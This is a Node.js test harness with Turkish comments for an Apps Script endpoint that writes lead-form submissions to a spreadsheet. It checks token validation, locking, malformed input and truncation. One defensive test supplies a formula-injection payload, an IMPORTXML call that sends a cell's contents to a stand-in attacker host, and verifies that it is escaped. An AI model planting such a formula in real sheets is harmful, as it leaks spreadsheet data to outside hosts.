/**
 * research/lead-sheet.gs icin sahte Apps Script ortami.
 *
 * Betik saf JS oldugu icin Apps Script global servislerini (PropertiesService,
 * LockService, SpreadsheetApp, ContentService) sahteleyip dogrudan kosturuyoruz.
 * Amac: Google'a DAGITMADAN once sozlesmeyi ve token kapisini dogrulamak —
 * repoda test kosucusu yok, bu dosya kendi kendine yeter.
 *
 * Kosum:  node research/lead-sheet.test.mjs
 * Gecme sarti: TOPLAM SORUN: 0 (cikis kodu 0)
 *
 * lead-sheet.gs her degistiginde ve yeni bir surum dagitilmadan once kosturulur.
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const HERE = dirname(fileURLToPath(import.meta.url));
const SRC = readFileSync(join(HERE, "lead-sheet.gs"), "utf8");

function makeEnv({ token = "gercek-token", lockFree = true } = {}) {
  const rows = [];
  let frozen = 0;
  let locked = false;

  const sheet = {
    getLastRow: () => rows.length,
    appendRow: (r) => rows.push(r.slice()),
    setFrozenRows: (n) => {
      frozen = n;
    },
  };

  const PropertiesService = {
    getScriptProperties: () => ({
      getProperty: (k) => (k === "LEAD_TOKEN" ? token : null),
    }),
  };

  const LockService = {
    getScriptLock: () => ({
      tryLock: () => {
        if (!lockFree) return false;
        if (locked) throw new Error("cift kilit");
        locked = true;
        return true;
      },
      releaseLock: () => {
        locked = false;
      },
    }),
  };

  const SpreadsheetApp = {
    getActiveSpreadsheet: () => ({
      getSheetByName: (n) => (n === "Talepler" ? sheet : null),
      getSheets: () => [sheet],
    }),
  };

  const ContentService = {
    MimeType: { JSON: "application/json" },
    createTextOutput: (text) => ({
      text,
      setMimeType(m) {
        this.mime = m;
        return this;
      },
    }),
  };

  const factory = new Function(
    "PropertiesService",
    "LockService",
    "SpreadsheetApp",
    "ContentService",
    SRC + "\nreturn { doPost: doPost, doGet: doGet, COLUMNS: COLUMNS };",
  );

  const api = factory(PropertiesService, LockService, SpreadsheetApp, ContentService);
  return {
    ...api,
    rows,
    lockState: () => locked,
    frozen: () => frozen,
  };
}

const post = (api, { token, body }) =>
  api.doPost({
    parameter: token === undefined ? {} : { token },
    postData: body === undefined ? undefined : { contents: body },
  });

const FULL = {
  at: "2026-09-11T12:00:00.000Z",
  env: "local",
  name: "Test Kullanici",
  club: "Test Kulup",
  branches: "3",
  phone: "+90 555 000 00 00",
  email: "test@example.com",
  segment: "reformer",
  message: "Merhaba, demo istiyorum.",
  consent: true,
  ua: "harness/1.0",
};

let fail = 0;
const check = (ad, kosul, detay = "") => {
  if (kosul) {
    console.log(`  PASS  ${ad}`);
  } else {
    fail++;
    console.log(`  FAIL  ${ad}${detay ? " — " + detay : ""}`);
  }
};

console.log("\n=== 1. Dogru token + tam govde -> {ok:true}, bir satir ===");
{
  const api = makeEnv();
  const res = post(api, { token: "gercek-token", body: JSON.stringify(FULL) });
  check("govde tam olarak {\"ok\":true}", res.text === '{"ok":true}', res.text);
  check("mime JSON", res.mime === "application/json", res.mime);
  check("iki satir (baslik + veri)", api.rows.length === 2, String(api.rows.length));
  check(
    "baslik satiri sutun semasiyla ayni",
    JSON.stringify(api.rows[0]) === JSON.stringify(api.COLUMNS),
    JSON.stringify(api.rows[0]),
  );
  check("baslik donduruldu", api.frozen() === 1);
  const row = api.rows[1];
  check("at ilk sutunda", row[0] === FULL.at, row[0]);
  check("env ikinci sutunda", row[1] === "local", row[1]);
  check("consent 'evet' olarak yazildi", row[9] === "evet", row[9]);
  check("kilit birakildi", api.lockState() === false);
  console.log("  satir:", JSON.stringify(row));
}

console.log("\n=== 2. BOZUK GIRDI: yanlis token -> red, satir YOK ===");
{
  const api = makeEnv();
  const res = post(api, { token: "yanlis-token", body: JSON.stringify(FULL) });
  check("code=bad-token", res.text === '{"ok":false,"code":"bad-token"}', res.text);
  check("hic satir yazilmadi", api.rows.length === 0, String(api.rows.length));
}

console.log("\n=== 2b. BOZUK GIRDI: token hic gonderilmedi -> red ===");
{
  const api = makeEnv();
  const res = post(api, { body: JSON.stringify(FULL) });
  check("code=bad-token", res.text === '{"ok":false,"code":"bad-token"}', res.text);
  check("hic satir yazilmadi", api.rows.length === 0, String(api.rows.length));
}

console.log("\n=== 3. BOS KAPSAM: LEAD_TOKEN tanimsiz -> fail-OPEN olmamali ===");
{
  const api = makeEnv({ token: null });
  const res = post(api, { token: "gercek-token", body: JSON.stringify(FULL) });
  check(
    "code=no-token-configured",
    res.text === '{"ok":false,"code":"no-token-configured"}',
    res.text,
  );
  check("hic satir yazilmadi", api.rows.length === 0, String(api.rows.length));
}

console.log("\n=== 3b. BOS KAPSAM kontrol grubu: token tanimsiz + bos token gonder ===");
{
  const api = makeEnv({ token: null });
  const res = post(api, { token: "", body: JSON.stringify(FULL) });
  check(
    "yine no-token-configured (bos==bos esitligi kapiyi acmiyor)",
    res.text === '{"ok":false,"code":"no-token-configured"}',
    res.text,
  );
  check("hic satir yazilmadi", api.rows.length === 0, String(api.rows.length));
}

console.log("\n=== 4. Eksik alanli govde -> satir duser, eksikler bos ===");
{
  const api = makeEnv();
  const res = post(api, {
    token: "gercek-token",
    body: JSON.stringify({ at: "2026-09-11T12:00:00.000Z", name: "Yalniz Ad" }),
  });
  check("ok:true", res.text === '{"ok":true}', res.text);
  const row = api.rows[1];
  check("sutun sayisi tam", row.length === api.COLUMNS.length, String(row.length));
  check("name yazildi", row[2] === "Yalniz Ad", row[2]);
  check(
    "eksik alanlar bos string",
    row.filter((v, i) => i !== 0 && i !== 2).every((v) => v === ""),
    JSON.stringify(row),
  );
}

console.log("\n=== 5. Arka arkaya 5 istek -> 5 veri satiri (kilit satir kaybettirmiyor) ===");
{
  const api = makeEnv();
  for (let i = 0; i < 5; i++) {
    post(api, {
      token: "gercek-token",
      body: JSON.stringify({ ...FULL, name: `Kullanici ${i + 1}` }),
    });
  }
  check("1 baslik + 5 veri = 6 satir", api.rows.length === 6, String(api.rows.length));
  check(
    "baslik yalniz bir kez yazildi",
    api.rows.filter((r) => r[0] === "at").length === 1,
  );
  check(
    "bes ad da sirayla dustu",
    api.rows.slice(1).map((r) => r[2]).join(",") ===
      "Kullanici 1,Kullanici 2,Kullanici 3,Kullanici 4,Kullanici 5",
    api.rows.slice(1).map((r) => r[2]).join(","),
  );
}

console.log("\n=== 6. Formul enjeksiyonu -> hucre metne sabitlenir ===");
{
  const api = makeEnv();
  post(api, {
    token: "gercek-token",
    body: JSON.stringify({
      ...FULL,
      message: '=IMPORTXML("http://kotu.example/?x="&A1,"//a")',
      club: "+15",
      name: "-5",
      segment: "@kotu",
    }),
  });
  const row = api.rows[1];
  check("message tek tirnakla kacirildi", row[8].startsWith("'="), row[8]);
  check("club (+) kacirildi", row[3] === "'+15", row[3]);
  check("name (-) kacirildi", row[2] === "'-5", row[2]);
  check("segment (@) kacirildi", row[7] === "'@kotu", row[7]);
  check("zararsiz metin dokunulmadan kaldi", row[4] === "3", row[4]);
}

console.log("\n=== 7. Bozuk JSON / bos govde / dizi govde ===");
{
  let api = makeEnv();
  let res = post(api, { token: "gercek-token", body: "{bozuk" });
  check("bad-json", res.text === '{"ok":false,"code":"bad-json"}', res.text);
  check("satir yok", api.rows.length === 0);

  api = makeEnv();
  res = post(api, { token: "gercek-token" });
  check("no-body", res.text === '{"ok":false,"code":"no-body"}', res.text);
  check("satir yok", api.rows.length === 0);

  api = makeEnv();
  res = post(api, { token: "gercek-token", body: "[1,2,3]" });
  check("dizi govde bad-json", res.text === '{"ok":false,"code":"bad-json"}', res.text);
  check("satir yok", api.rows.length === 0);
}

console.log("\n=== 8. Kilit alinamazsa -> busy, sessiz kayip yok ===");
{
  const api = makeEnv({ lockFree: false });
  const res = post(api, { token: "gercek-token", body: JSON.stringify(FULL) });
  check("code=busy", res.text === '{"ok":false,"code":"busy"}', res.text);
  check("satir yok", api.rows.length === 0);
}

console.log("\n=== 9. doGet -> JSON, HTML degil ===");
{
  const api = makeEnv();
  const res = api.doGet();
  check("use-post", res.text === '{"ok":false,"code":"use-post"}', res.text);
  check("mime JSON", res.mime === "application/json", res.mime);
}

console.log("\n=== 10. Uzun metin kirpma (ikinci kemer) ===");
{
  const api = makeEnv();
  post(api, {
    token: "gercek-token",
    body: JSON.stringify({ ...FULL, message: "x".repeat(9000) }),
  });
  check("4000 karaktere kirpildi", api.rows[1][8].length === 4000, String(api.rows[1][8].length));
}

console.log(
  `\n===========================\nTOPLAM SORUN: ${fail}\n===========================\n`,
);
process.exit(fail === 0 ? 0 : 1);
